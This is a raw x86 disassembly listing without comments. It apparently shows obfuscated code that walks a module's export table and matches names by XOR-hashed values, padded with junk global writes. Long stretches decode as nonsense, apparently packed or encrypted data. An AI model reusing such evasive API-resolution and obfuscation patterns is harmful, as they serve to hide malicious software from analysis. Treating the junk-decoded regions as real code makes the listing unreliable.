  411a74:	add    ecx,ebx
  411a76:	mov    DWORD PTR [ebp-0x20],ecx
  411a79:	mov    DWORD PTR ds:0x4344b7,ebx
  411a7f:	mov    eax,DWORD PTR [ebp-0x20]
  411a82:	mov    DWORD PTR ds:0x43447f,0x2abf
  411a8c:	je     0x4122b7
  411a92:	adc    DWORD PTR ds:0x43446b,0x60fd
  411a9c:	mov    eax,DWORD PTR [ebp-0x4]
  411a9f:	adc    DWORD PTR ds:0x4344d3,0x6e6
  411aa9:	xor    eax,0x7510851
  411aae:	or     DWORD PTR ds:0x434543,0x4344fb
  411ab8:	add    eax,ebx
  411aba:	mov    DWORD PTR ds:0x434593,0x35f1
  411ac4:	cmp    edi,eax
  411ac6:	jne    0x411c5a
  411acc:	sbb    DWORD PTR ds:0x434473,0x434467
  411ad6:	push   DWORD PTR [ebp+0x8]
  411ad9:	or     DWORD PTR ds:0x43458f,0x43454b
  411ae3:	call   0x4104be
  411ae8:	and    ecx,DWORD PTR ds:0x4344cf
  411aee:	mov    DWORD PTR [ebp-0x20],eax
  411af1:	mov    eax,DWORD PTR [ebp-0x4]
  411af4:	mov    ecx,DWORD PTR [ebp-0x20]
  411af7:	and    DWORD PTR ds:0x434537,0x0
  411b01:	mov    esi,DWORD PTR ds:0x434537
  411b07:	inc    esi
  411b08:	mov    DWORD PTR ds:0x434537,esi
  411b0e:	cmp    DWORD PTR ds:0x434537,0x1e
  411b15:	jne    0x411b26
  411b1b:	push   0x1cd9
  411b20:	call   DWORD PTR ds:0x4132b4
  411b26:	cmp    DWORD PTR ds:0x434537,0x18
  411b2d:	jb     0x411b01
  411b33:	mov    esi,0x7510851
  411b38:	xor    eax,esi
  411b3a:	add    eax,ebx
  411b3c:	cmp    ecx,eax
  411b3e:	je     0x411e9b
  411b44:	or     DWORD PTR ds:0x434537,0x4344f7
  411b4e:	push   DWORD PTR [ebp-0x20]
  411b51:	push   DWORD PTR [ebp+0x8]
  411b54:	sub    DWORD PTR ds:0x4344b7,0x434467
  411b5e:	call   0x404d31
  411b63:	movzx  ecx,WORD PTR ds:0x434537
  411b6a:	and    ecx,DWORD PTR ds:0x43450b
  411b70:	mov    DWORD PTR ds:0x434537,ecx
  411b76:	mov    DWORD PTR [ebp-0x14],eax
  411b79:	mov    DWORD PTR ds:0x43458f,0x13
  411b83:	cmp    DWORD PTR ds:0x43458f,0x0
  411b8a:	je     0x411bc6
  411b90:	cmp    DWORD PTR ds:0x43458f,0x22
  411b97:	jne    0x411bad
  411b9d:	push   0x434690
  411ba2:	push   0x434635
  411ba7:	call   DWORD PTR ds:0x4130e4
  411bad:	xor    eax,eax
  411baf:	or     eax,DWORD PTR ds:0x43458f
  411bb5:	dec    eax
  411bb6:	mov    ds:0x43458f,eax
  411bbb:	jmp    0x411b83
  411bc0:	add    DWORD PTR ds:0x43446b,edx
  411bc6:	mov    eax,DWORD PTR [ebp-0x4]
  411bc9:	mov    DWORD PTR ds:0x43454b,0x10
  411bd3:	cmp    DWORD PTR ds:0x43454b,0x0
  411bda:	je     0x411c1c
  411be0:	cmp    DWORD PTR ds:0x43454b,0x1b
  411be7:	jne    0x411c0a
  411bed:	push   DWORD PTR [ebp-0x20]
  411bf0:	push   0x4372
  411bf5:	push   0x434755
  411bfa:	push   0x434769
  411bff:	push   0x7ff3
  411c04:	call   DWORD PTR ds:0x4130e8
  411c0a:	mov    ecx,DWORD PTR ds:0x43454b
  411c10:	dec    ecx
  411c11:	mov    DWORD PTR ds:0x43454b,ecx
  411c17:	jmp    0x411bd3
  411c1c:	mov    ecx,DWORD PTR [ebp-0x14]
  411c1f:	xor    eax,esi
  411c21:	add    eax,ebx
  411c23:	cmp    ecx,eax
  411c25:	je     0x411e9b
  411c2b:	mov    eax,DWORD PTR [ebp-0x14]
  411c2e:	mov    eax,DWORD PTR [eax+0x18]
  411c31:	mov    DWORD PTR [ebp-0x20],eax
  411c34:	mov    eax,DWORD PTR [ebp-0x14]
  411c37:	mov    ecx,DWORD PTR [ebp+0x8]
  411c3a:	add    ecx,DWORD PTR [eax+0x20]
  411c3d:	mov    DWORD PTR [ebp-0x28],ecx
  411c40:	mov    eax,DWORD PTR [ebp-0x14]
  411c43:	mov    ecx,DWORD PTR [ebp+0x8]
  411c46:	add    ecx,DWORD PTR [eax+0x24]
  411c49:	mov    DWORD PTR [ebp-0x2c],ecx
  411c4c:	mov    eax,DWORD PTR [ebp-0x14]
  411c4f:	mov    ecx,DWORD PTR [ebp+0x8]
  411c52:	add    ecx,DWORD PTR [eax+0x1c]
  411c55:	xor    esi,esi
  411c57:	mov    DWORD PTR [ebp-0x14],ecx
  411c5a:	mov    eax,DWORD PTR [ebp-0x28]
  411c5d:	mov    ecx,DWORD PTR [ebp+0x8]
  411c60:	jmp    0x411e60
  411c65:	scas   al,BYTE PTR es:[edi]
  411c66:	repz push esi
  411c68:	add    dl,BYTE PTR [ebx-0x5d]
  411c6b:	push   0x73
  411c6d:	out    dx,eax
  411c6e:	sub    DWORD PTR [ecx+0x2f],esp
  411c71:	push   0xffffffc0
  411c73:	inc    ebp
  411c74:	cmp    eax,0x7e7e56d5
  411c79:	pop    ecx
  411c7a:	jg     0x411cfa
  411c7c:	jle    0x411c2c
  411c7e:	push   ebp
  411c7f:	mov    dh,0x8
  411c81:	scas   eax,DWORD PTR es:[edi]
  411c82:	xchg   edi,eax
  411c83:	mov    esp,0x5bd7e1a1
  411c88:	scas   al,BYTE PTR es:[edi]
  411c89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c8a:	outs   dx,DWORD PTR ds:[esi]
  411c8b:	adc    DWORD PTR [ebp-0x4aad7d1f],0x3a
  411c92:	adc    BYTE PTR [ecx],dh
  411c94:	repnz call 0x9e3e:0x53ea347a
  411c9c:	push   0x1b584fdb
  411ca1:	icebp  
  411ca2:	loope  0x411c41
  411ca4:	inc    esi
  411ca5:	mov    al,ds:0x2e55b48d
  411caa:	mov    BYTE PTR [ebp+ebp*4+0x41a0caed],dl
  411cb1:	mov    dh,0x91
  411cb3:	xchg   edx,eax
  411cb4:	and    ch,BYTE PTR [edi-0x5a1c8041]
  411cba:	lds    ebp,FWORD PTR [edi-0x6e8389d]
  411cc0:	jbe    0x411d31
  411cc2:	ror    BYTE PTR [eax+0x75],1
  411cc5:	xor    edi,edi
  411cc7:	retf   
  411cc8:	nop
  411cc9:	xor    eax,0xff3f6208
  411cce:	jbe    0x411c6b
  411cd0:	or     eax,0x495fb9a3
  411cd5:	ds push cs
  411cd7:	dec    ebx
  411cd8:	sub    eax,0x639f91f6
  411cdd:	in     eax,0xc6
  411cdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ce0:	fwait
  411ce1:	ja     0x411c64
  411ce3:	mov    ebx,0xb8b0f3f3
  411ce8:	popf   
  411ce9:	dec    ebp
  411cea:	mov    DWORD PTR ds:0x5b8fbc67,eax
  411cf0:	mov    al,0x48
  411cf2:	cmp    DWORD PTR [edx-0x21a6db86],esp
  411cf8:	add    eax,0x12c3d5c6
  411cfd:	cld    
  411cfe:	mov    ebx,0x9587abd4
  411d03:	lea    ebx,ds:0x9f4a97ca
  411d09:	and    DWORD PTR [edx],ebp
  411d0b:	add    edi,edx
  411d0d:	imul   edx,DWORD PTR [edi+edx*4],0xea67f612
  411d14:	cmc    
  411d15:	and    al,0xa8
  411d17:	sub    DWORD PTR [esi-0x13dae93],0x272a87a6
  411d21:	cmp    al,0xe9
  411d23:	out    0x26,al
  411d25:	dec    edi
  411d26:	mov    esp,cs
  411d28:	or     al,BYTE PTR [edi+0x2ea22ed7]
  411d2e:	push   0xffffffe8
  411d30:	mov    cl,0xcf
  411d32:	data16 jmp 0x411cea
  411d35:	pushf  
  411d36:	sbb    dl,BYTE PTR [esi-0x5f]
  411d39:	stc    
  411d3a:	mov    edx,0xf3161499
  411d3f:	pop    DWORD PTR [eax+0x1e10c1ff]
  411d45:	dec    esp
  411d46:	push   eax
  411d47:	(bad)  
  411d48:	pop    edx
  411d49:	mov    ecx,0xd119ba3e
  411d4e:	fadd   st(4),st
  411d50:	lods   eax,DWORD PTR ds:[esi]
  411d51:	sub    ch,BYTE PTR [ebx-0x1e6d5c68]
  411d57:	icebp  
  411d58:	aas    
  411d59:	push   0x250a16b9
  411d5e:	(bad)  
  411d5f:	jb     0x411cf0
  411d61:	xchg   esp,eax
  411d62:	mov    ds:0x76f7012a,eax
  411d67:	daa    
  411d68:	jne    0x411d08
  411d6a:	push   ebp
  411d6b:	jge    0x411d85
  411d6d:	inc    esp
  411d6e:	in     al,0xba
  411d70:	jle    0x411d04
  411d72:	(bad)  
  411d73:	jb     0x411dc0
  411d75:	ss cld 
  411d77:	pop    ds
  411d78:	or     dh,ah
  411d7a:	je     0x411d51
  411d7c:	xchg   ebp,eax
  411d7d:	stos   DWORD PTR es:[edi],eax
  411d7e:	jecxz  0x411d57
  411d80:	sbb    BYTE PTR [ebx],dl
  411d82:	div    BYTE PTR [ebx-0x14fb0e2e]
  411d88:	aad    0x41
  411d8a:	test   esp,edx
  411d8c:	mov    WORD PTR [ebx],?
  411d8e:	add    cl,cl
  411d90:	outs   dx,DWORD PTR ds:[esi]
  411d91:	add    al,dl
  411d93:	cli    
  411d94:	mov    bl,0x5a
  411d96:	das    
  411d97:	into   
  411d98:	out    dx,eax
  411d99:	xchg   ecx,eax
  411d9a:	imul   DWORD PTR [ecx+0x1772a3f0]
  411da0:	jg     0x411d69
  411da2:	cmp    ecx,DWORD PTR [eax+0x72369af]
  411da8:	sbb    ah,BYTE PTR [ecx]
  411daa:	and    DWORD PTR [edi+esi*1],eax
  411dad:	ror    DWORD PTR [edi-0x491bbece],cl
  411db3:	cmp    esp,DWORD PTR [ebx]
  411db5:	mov    gs,ecx
  411db7:	jmp    0x411d4c
  411db9:	and    al,0x6
  411dbb:	fadd   DWORD PTR [ebx]
  411dbd:	shl    DWORD PTR [ecx+0x2b84351c],0x42
  411dc4:	jno    0x411d8f
  411dc6:	sbb    DWORD PTR [ecx+ecx*1-0x4b4f0d32],ecx
  411dcd:	in     al,0x5f
  411dcf:	sahf   
  411dd0:	dec    edi
  411dd1:	cld    
  411dd2:	mov    cl,0xbb
  411dd4:	add    BYTE PTR [ebx-0x48be9ddc],0xb5
  411ddb:	in     eax,dx
  411ddc:	rcr    DWORD PTR [edx-0x31],0x8
  411de0:	jg     0x411e12
  411de2:	inc    edi
  411de3:	lahf   
  411de4:	xchg   ebp,eax
  411de5:	aas    
  411de6:	(bad)  
  411de8:	xchg   DWORD PTR [ecx],eax
  411dea:	outs   dx,DWORD PTR ds:[esi]
  411deb:	mov    BYTE PTR [edx],ch
  411ded:	ins    DWORD PTR es:[edi],dx
  411dee:	test   DWORD PTR [eax+0x1e],eax
  411df1:	pop    edi
  411df2:	lahf   
  411df3:	cdq    
  411df4:	fs jnp 0x411db8
  411df7:	pop    edi
  411df8:	mov    ah,0x27
  411dfa:	call   0xb9cb1e80
  411dff:	adc    eax,0xd70287cc
  411e04:	in     eax,dx
  411e05:	push   ebp
  411e06:	add    eax,0x22af7323
  411e0b:	stc    
  411e0c:	xor    eax,0x7d9d776a
  411e11:	ja     0x411da1
  411e13:	cdq    
  411e14:	fld    TBYTE PTR [edi-0x79211d3c]
  411e1a:	xor    al,0xb0
  411e1c:	push   edx
  411e1d:	sahf   
  411e1e:	dec    eax
  411e1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e20:	or     dl,BYTE PTR [edi+0x7f50d941]
  411e26:	or     al,ch
  411e28:	xlat   BYTE PTR ds:[ebx]
  411e29:	or     ah,dl
  411e2b:	out    0x68,eax
  411e2d:	pop    es
  411e2e:	dec    esp
  411e2f:	ss int 0x24
  411e32:	loope  0x411e29
  411e34:	jmp    0xc180:0x61a32d05
  411e3b:	retf   0x74a6
  411e3e:	push   esp
  411e3f:	rcl    BYTE PTR [ebx],cl
  411e41:	or     eax,0x80a23eac
  411e46:	call   0xcbf4:0xebf9a614
  411e4d:	and    cl,BYTE PTR [ebp+0x51]
  411e50:	sub    bh,bh
  411e52:	add    eax,0xeeff75e3
  411e57:	test   eax,0xbff407d7
  411e5c:	out    dx,eax
  411e5d:	and    BYTE PTR [esi],ch
  411e5f:	rol    BYTE PTR [ebx],0xc
  411e62:	mov    eax,0x89f8458d
  411e67:	dec    ebp
  411e68:	rcl    BYTE PTR [eax-0x1],1
  411e6b:	jne    0x411e3d
  411e6d:	push   DWORD PTR [ebp+0xc]
  411e70:	call   0x402e72
  411e75:	mov    eax,DWORD PTR [ebp-0x4]
  411e78:	mov    ecx,DWORD PTR [ebp-0x8]
  411e7b:	xor    eax,0x7510851
  411e80:	add    eax,ebx
  411e82:	cmp    ecx,eax
  411e84:	jne    0x411ea7
  411e8a:	mov    eax,DWORD PTR [ebp-0x20]
  411e8d:	inc    edi
  411e8e:	cmp    edi,eax
  411e90:	jb     0x411a92
  411e96:	jmp    0x4122b7
  411e9b:	mov    eax,DWORD PTR [ebp-0x4]
  411e9e:	xor    eax,esi
  411ea0:	add    eax,ebx
  411ea2:	jmp    0x412c05
  411ea7:	mov    eax,DWORD PTR [ebp-0x2c]
  411eaa:	movzx  eax,WORD PTR [eax+edi*2]
  411eae:	jmp    0x4120ae
  411eb3:	retf   
  411eb4:	dec    ebp
  411eb5:	add    DWORD PTR [edi+0x6d757391],esi
  411ebb:	je     0x411ea0
  411ebd:	jge    0x411f08
  411ebf:	sbb    ecx,ebx
  411ec1:	jb     0x411f13
  411ec3:	xor    BYTE PTR [eax+0x7e],dl
  411ec6:	jle    0x411f21
  411ec8:	jg     0x411f48
  411eca:	jle    0x411e68
  411ecc:	mov    BYTE PTR [esp+edi*2-0x6b532fee],0x72
  411ed4:	pop    eax
  411ed5:	ficom  WORD PTR [edx+0x67]
  411ed8:	dec    esp
  411ed9:	bound  edx,QWORD PTR [eax+edx*8+0x23]
  411edd:	scas   al,BYTE PTR es:[edi]
  411ede:	mov    bh,0x77
  411ee0:	sub    BYTE PTR gs:[ecx+0x6fb9991c],dh
  411ee7:	dec    ebx
  411ee8:	xor    DWORD PTR [eax-0x3a],edi
  411eeb:	sbb    al,0x41
  411eed:	or     BYTE PTR [edx],dl
  411eef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ef0:	in     eax,dx
  411ef1:	retf   
  411ef2:	dec    esp
  411ef3:	int3   
  411ef4:	js     0x411e9a
  411ef6:	jne    0x411f29
  411ef8:	or     DWORD PTR [eax+ebp*2],0x52
  411efc:	mov    al,0x2e
  411efe:	aaa    
  411eff:	push   0x544ea521
  411f04:	and    DWORD PTR [edi+0x736189b5],edi
  411f0a:	jecxz  0x411f11
  411f0c:	addr16 adc eax,0x9ec1ea0e
  411f12:	jg     0x411ef0
  411f14:	mov    BYTE PTR [ecx],dh
  411f16:	jb     0x411f58
  411f18:	ficom  DWORD PTR [ecx-0x23]
  411f1b:	(bad)  
  411f1e:	pop    ecx
  411f1f:	cmp    al,0xb1
  411f21:	cli    
  411f22:	adc    al,0xe4
  411f24:	pop    edx
  411f25:	popa   
  411f26:	iret   
  411f27:	or     bl,BYTE PTR [edi+edx*2-0x37]
  411f2b:	sahf   
  411f2c:	xchg   dl,ch
  411f2e:	mov    ebx,0xfda75e5b
  411f33:	jg     0x411eb5
  411f35:	(bad)  
  411f36:	mov    cl,0x6b
  411f38:	push   ds
  411f39:	and    BYTE PTR [ecx+0x48f67038],0x75
  411f40:	sbb    cl,cl
  411f42:	cmp    DWORD PTR [ebp-0x260703da],edi
  411f48:	jns    0x411ee4
  411f4a:	in     eax,dx
  411f4b:	mov    eax,0x68387296
  411f50:	inc    ecx
  411f51:	cmp    al,BYTE PTR [edx+0x71b4986]
  411f57:	jns    0x411efc
  411f59:	int    0xdd
  411f5b:	mov    al,0x83
  411f5d:	and    al,0x92
  411f5f:	loop   0x411f31
  411f61:	jae    0x411f76
  411f63:	cmp    al,0x90
  411f65:	aad    0x54
  411f67:	int    0xc5
  411f69:	sbb    al,0xa3
  411f6b:	adc    edx,DWORD PTR [eax-0x12]
  411f6e:	data16 in al,dx
  411f70:	nop
  411f71:	ficom  WORD PTR [ebx+0x7f]
  411f74:	(bad)  
  411f75:	jmp    FWORD PTR [eax-0x4c]
  411f78:	jns    0x411fe6
  411f7a:	mov    edi,0x32563423
  411f7f:	or     ch,BYTE PTR [edi+ebx*4+0x38e543]
  411f86:	ror    DWORD PTR [eax-0x51],cl
  411f89:	fistp  DWORD PTR [esp+edx*2]
  411f8c:	iret   
  411f8d:	or     eax,0x5950f8fe
  411f92:	dec    ebx
  411f93:	xchg   esp,eax
  411f94:	imul   edx,DWORD PTR [esi-0x4b],0xa240525b
  411f9b:	pop    ebp
  411f9c:	and    DWORD PTR [eax],ebx
  411f9e:	push   esi
  411f9f:	std    
  411fa0:	mov    ch,0x7f
  411fa2:	rcl    BYTE PTR [bx],0xab
  411fa6:	cdq    
  411fa7:	in     al,0x62
  411fa9:	mov    al,ds:0xad0fd8e0
  411fae:	lock sbb al,0x7c
  411fb1:	mov    gs,WORD PTR [eax]
  411fb3:	pusha  
  411fb4:	in     al,0x51
  411fb6:	sub    DWORD PTR [edx-0x6e],0xb6948c3d
  411fbd:	mov    ecx,0x1b6bde74
  411fc2:	mov    ah,0x9d
  411fc4:	call   0x4075:0x9be21953
  411fcb:	cmp    cl,BYTE PTR [ecx-0x34]
  411fce:	xor    dh,bh
  411fd0:	ss pop edx
  411fd2:	cdq    
  411fd3:	popa   
  411fd4:	push   ds
  411fd5:	and    eax,0xc4332df7
  411fda:	push   es
  411fdb:	cs fwait
  411fdd:	and    edx,edi
  411fdf:	cmp    edx,DWORD PTR [esp+ebx*2+0x3aab1fd2]
  411fe6:	xlat   BYTE PTR ds:[ebx]
  411fe7:	push   edi
  411fe8:	aas    
  411fe9:	pop    ecx
  411fea:	mov    esi,0xf7a244ad
  411fef:	xchg   ebx,eax
  411ff0:	jg     0x41200b
  411ff2:	mov    bl,0x69
  411ff4:	dec    esp
  411ff5:	scas   al,BYTE PTR es:[edi]
  411ff6:	neg    DWORD PTR cs:[ecx+edi*2]
  411ffa:	mov    ecx,edx
  411ffc:	repz mov ah,0xb8
  411fff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412000:	xchg   edx,eax
  412001:	fld    st(2)
  412003:	cld    
  412004:	scas   eax,DWORD PTR es:[edi]
  412005:	push   edx
  412006:	xor    dl,BYTE PTR [ecx]
  412008:	add    BYTE PTR [ebp+0xe19fa3b],0xdf
  41200f:	jg     0x41204b
  412011:	shl    ch,0xca
  412014:	scas   al,BYTE PTR es:[edi]
  412015:	mov    dh,0xf
  412017:	xchg   ecx,eax
  412018:	in     al,0xf
  41201a:	fmul   QWORD PTR [ebx]
  41201c:	jbe    0x412067
  41201e:	lahf   
  41201f:	xchg   ebx,eax
  412020:	inc    edi
  412021:	mov    al,0xbb
  412023:	lahf   
  412024:	sub    al,0x3f
  412026:	mov    gs,WORD PTR [ecx-0x58]
  412029:	inc    esi
  41202a:	ror    BYTE PTR [ebp+0x3a431b89],0x5
  412031:	sti    
  412032:	lods   al,BYTE PTR ds:[esi]
  412033:	ins    DWORD PTR es:[edi],dx
  412034:	int    0xf8
  412036:	idiv   BYTE PTR [ecx]
  412038:	push   edx
  412039:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41203a:	in     eax,dx
  41203b:	pop    ebx
  41203c:	xchg   edi,eax
  41203d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41203e:	inc    ecx
  41203f:	push   ecx
  412040:	sbb    bl,BYTE PTR [eax+0x7f3ca995]
  412046:	xchg   esi,eax
  412047:	mov    edx,0xe50ed717
  41204c:	dec    edx
  41204d:	mov    bl,0xcc
  41204f:	mov    ebx,DWORD PTR [edx-0x1e2f7af4]
  412055:	adc    ecx,DWORD PTR [edi+0x2acd3c29]
  41205b:	jnp    0x412058
  41205d:	rcl    DWORD PTR [ebp+0x77b4daa7],0x2b
  412064:	call   0xf5a2:0x566ab99
  41206b:	adc    BYTE PTR [edi-0x1f3ff56b],bl
  412071:	xchg   ebx,eax
  412072:	jno    0x4120a4
  412074:	in     eax,dx
  412075:	jl     0x4120ca
  412077:	rcr    DWORD PTR [edi+0x7d0ac91b],1
  41207d:	les    edi,FWORD PTR [ebx]
  41207f:	or     al,0x4b
  412081:	dec    ebp
  412082:	cs adc eax,0xa1cde3d6
  412088:	pop    edx
  412089:	dec    ecx
  41208a:	or     eax,0x3aa912e6
  41208f:	loopne 0x412039
  412091:	fild   DWORD PTR [esi-0x2af47b0d]
  412097:	mov    dh,BYTE PTR [edi]
  412099:	or     esi,0xece00ff5
  41209f:	add    cl,ch
  4120a1:	out    dx,eax
  4120a2:	mov    cl,0xea
  4120a4:	pushf  
  4120a5:	mov    dl,0x21
  4120a7:	addr16 dec ecx
  4120a9:	push   ebx
  4120aa:	int3   
  4120ab:	and    dh,BYTE PTR [eax]
  4120ad:	dec    DWORD PTR [ebx+0x48bec4d]
  4120b3:	sub    ecx,0x1fb
  4120b9:	cmp    DWORD PTR [ecx+ebx*4+0x69156508],esp
  4120c0:	jne    0x4120eb
  4120c2:	xchg   edx,eax
  4120c3:	mov    al,0xd4
  4120c5:	xor    al,0x16
  4120c7:	mov    dh,0x5f
  4120c9:	adc    edx,DWORD PTR [edx+0x7e]
  4120cc:	jle    0x412127
  4120ce:	jg     0x41214e
  4120d0:	jle    0x41206a
  4120d2:	clc    
  4120d3:	cmp    al,0xff
  4120d5:	daa    
  4120d6:	pusha  
  4120d7:	dec    esi
  4120d8:	xchg   edx,eax
  4120d9:	add    ebp,edx
  4120db:	cmc    
  4120dc:	(bad)
  4120df:	mov    esi,0xc13e04e0
  4120e4:	and    DWORD PTR [ebx+0x45],esp
  4120e7:	or     bh,BYTE PTR [ecx+0x6da92e20]
  4120ed:	pop    ebp
  4120ee:	or     DWORD PTR [edi],ebp
  4120f0:	jno    0x4120e8
  4120f2:	inc    eax
  4120f3:	outs   dx,BYTE PTR ds:[esi]
  4120f4:	imul   edx,ebp,0xffffffb4
  4120f7:	retf   0x32c2
  4120fa:	nop    ebx
  4120fd:	mov    ebp,0x9df1da04
  412102:	ret    0x5e2e
  412105:	or     al,BYTE PTR [eax-0x42]
  412108:	mov    DWORD PTR [di+0x4b85],esp
  41210d:	(bad)  
  41210e:	dec    esp
  41210f:	hlt    
  412110:	xchg   ebp,eax
  412111:	inc    ebx
  412112:	aaa    
  412113:	xchg   ebx,eax
  412114:	retf   0x9bcd
  412117:	xor    ebx,DWORD PTR [edi-0x32]
  41211a:	mov    eax,0x67bb397
  41211f:	fist   WORD PTR [ebx]
  412121:	fild   DWORD PTR [ebx]
  412123:	xchg   edi,eax
  412124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412125:	mov    ch,0xaa
  412127:	mov    dh,0x1c
  412129:	ds jmp 0xd0e44dce
  41212f:	pushf  
  412130:	cmp    ax,0xa32c
  412134:	sub    eax,0x46f120af
  412139:	jle    0x41218c
  41213b:	in     eax,0xf
  41213d:	mov    esi,0x118f8347
  412142:	fcom   QWORD PTR [ecx+0x20]
  412145:	lock popf 
  412147:	(bad)  
  412148:	sbb    eax,0xddf36cf
  41214d:	scas   al,BYTE PTR es:[edi]
  41214e:	xor    BYTE PTR [eax-0x303a4587],ah
  412154:	das    
  412155:	sub    esp,DWORD PTR ds:0x96b0973a
  41215c:	xchg   edi,eax
  41215d:	fs inc ebp
  41215f:	aam    0xb0
  412161:	adc    al,0x6b
  412164:	stos   DWORD PTR es:[edi],eax
  412165:	xor    al,0xbe
  412167:	fiadd  WORD PTR [ecx]
  412169:	xchg   edi,eax
  41216a:	xchg   ebx,eax
  41216b:	lahf   
  41216c:	enter  0xbffd,0xdc
  412170:	jne    0x41217d
  412172:	xchg   cx,ax
  412174:	mov    DWORD PTR [esi-0xd94e588],esi
  41217a:	jl     0x4121c9
  41217c:	mov    al,ds:0x90e8611c
  412181:	mov    cl,0xc5
  412183:	sti    
  412184:	loopne 0x41212c
  412186:	iret   
  412187:	lea    ecx,[eax-0x254d530e]
  41218d:	mov    dh,0xeb
  41218f:	or     DWORD PTR [eax+0xe43d82d],ebp
  412195:	push   ds
  412196:	mov    edi,0x1fd22898
  41219b:	sbb    al,0xc
  41219d:	imul   ecx,DWORD PTR [ebp-0x63],0xffffffa1
  4121a1:	xchg   ebx,eax
  4121a2:	push   ecx
  4121a3:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4121a5:	push   eax
  4121a6:	sbb    al,0x6d
  4121a8:	sub    bl,dl
  4121aa:	in     al,0x99
  4121ac:	aaa    
  4121ad:	je     0x41222c
  4121af:	ror    BYTE PTR ds:0x662f7f17,0x9d
  4121b6:	mov    bl,BYTE PTR [eax+0x79]
  4121b9:	cmp    DWORD PTR [edx+0x4a],edi
  4121bc:	xchg   ebx,eax
  4121bd:	inc    esi
  4121be:	ficom  DWORD PTR [ecx]
  4121c0:	imul   eax,DWORD PTR [edi],0xbb0b7c94
  4121c6:	icebp  
  4121c7:	mov    ecx,DWORD PTR [ebx]
  4121c9:	push   ds
  4121ca:	cli    
  4121cb:	repnz sbb al,0x23
  4121ce:	imul   esi,DWORD PTR [ebx-0x24],0xd541be59
  4121d5:	jo     0x41216e
  4121d7:	jmp    0x5754:0x8071757
  4121de:	test   DWORD PTR [edi-0x5b170599],edi
  4121e4:	add    BYTE PTR [eax+0x0],bl
  4121e7:	push   es
  4121e8:	retf   
  4121e9:	lods   eax,DWORD PTR ds:[esi]
  4121ea:	stos   BYTE PTR es:[edi],al
  4121eb:	adc    ebp,0x6d7d1fc4
  4121f1:	mov    esp,0x1cd53963
  4121f6:	scas   al,BYTE PTR es:[edi]
  4121f7:	dec    esp
  4121f8:	je     0x412221
  4121fa:	mov    al,ds:0x42afe4fd
  4121ff:	es jecxz 0x41223c
  412202:	cmc    
  412203:	xchg   ecx,eax
  412204:	xchg   ecx,eax
  412205:	mov    bl,0x5c
  412207:	jge    0x412285
  412209:	or     eax,0xbe8a655b
  41220e:	xchg   ecx,eax
  41220f:	call   0xef7ea11c
  412214:	mov    al,0xff
  412216:	mov    ecx,0xb9cce2ec
  41221b:	xchg   esp,eax
  41221c:	(bad)  
  41221d:	iret   
  41221e:	dec    edx
  41221f:	mov    ?,WORD PTR [eax+ebx*4-0x4a0a015]
  412226:	mov    al,ds:0xc3ffcf6f
  41222b:	test   BYTE PTR [ecx],al
  41222d:	sub    al,0x3e
  41222f:	leave  
  412230:	mov    ebp,0x41a8728d
  412235:	inc    edx
  412236:	xchg   esi,eax
  412237:	repz pop ss
  412239:	inc    ebp
  41223a:	ins    BYTE PTR es:[edi],dx
  41223b:	and    al,0x1c
  41223d:	cmp    edi,DWORD PTR ds:[eax]
  412240:	or     al,0x83
  412242:	test   eax,0x69d976b6
  412247:	pop    esi
  412248:	jge    0x41224c
  41224a:	scas   eax,DWORD PTR es:[edi]
  41224b:	rcr    cl,0x27
  41224e:	gs loopne 0x412239
  412251:	imul   ebp,DWORD PTR [ebp+0x6e],0x804ec3af
  412258:	out    0x24,al
  41225a:	gs mov esi,0xf486927c
  412260:	aaa    
  412261:	stc    
  412262:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412263:	and    esi,edx
  412265:	mov    dh,0x5
  412267:	xchg   BYTE PTR [edx],cl
  412269:	sti    
  41226a:	out    0x37,al
  41226c:	xchg   edx,eax
  41226d:	das    
  41226e:	retf   0x4357
  412271:	jp     0x41226e
  412273:	scas   eax,DWORD PTR es:[edi]
  412274:	in     eax,0x62
  412276:	xchg   esp,eax
  412277:	cwde   
  412278:	stos   DWORD PTR es:[edi],eax
  412279:	and    DWORD PTR [esi+0x58],ebx
  41227c:	xor    al,0xd1
  41227e:	mov    BYTE PTR [ebx+eiz*2-0x3e],bh
  412282:	fstp   QWORD PTR [esi]
  412284:	pop    edx
  412285:	add    DWORD PTR [eax*1-0x4e54f518],ebp
  41228c:	add    al,0x14
  41228e:	sub    edx,DWORD PTR [esi]
  412290:	pop    eax
  412291:	jmp    0x41222f
  412293:	shr    BYTE PTR [esi-0x59],cl
  412296:	in     eax,dx
  412297:	iret   
  412298:	xchg   edx,eax
  412299:	fs mov ecx,0x1540a178
  41229f:	jle    0x412267
  4122a1:	mov    ebx,0xb9f93cc
  4122a6:	jo     0x4122c0
  4122a8:	sbb    DWORD PTR [edi],0x1c
  4122ab:	ds mov esi,0x8cb8c807
  4122b1:	enter  0xa953,0x89
  4122b5:	inc    ebp
  4122b6:	or     al,0x8b
  4122b8:	inc    ebp
  4122b9:	cld    
  4122ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4122bd:	xor    eax,0x7510851
  4122c2:	add    eax,ebx
  4122c4:	cmp    ecx,eax
  4122c6:	jne    0x4122d9
  4122cc:	mov    eax,DWORD PTR [ebp-0x4]
  4122cf:	xor    eax,0x7510851
  4122d4:	jmp    0x411ea0
  4122d9:	mov    eax,DWORD PTR [ebp+0xc]
  4122dc:	jmp    0x4124dc
  4122e1:	xchg   DWORD PTR [eax],esp
  4122e3:	aam    0x43
  4122e5:	jne    0x41235a
  4122e7:	xchg   ecx,eax
  4122e8:	in     al,dx
  4122e9:	sub    BYTE PTR [ebx+0x46b13ed],ch
  4122ef:	ror    DWORD PTR [edx+0x7e7e5c7e],1
  4122f5:	pop    ecx
  4122f6:	jg     0x412376
  4122f8:	jle    0x4122d6
  4122fa:	stos   BYTE PTR es:[edi],al
  4122fb:	imul   ebp,eax,0xfb80d2a8
  412301:	ret    
  412302:	retf   0x523b
  412305:	dec    edi
  412306:	pop    ss
  412307:	loop   0x412362
  412309:	inc    edi
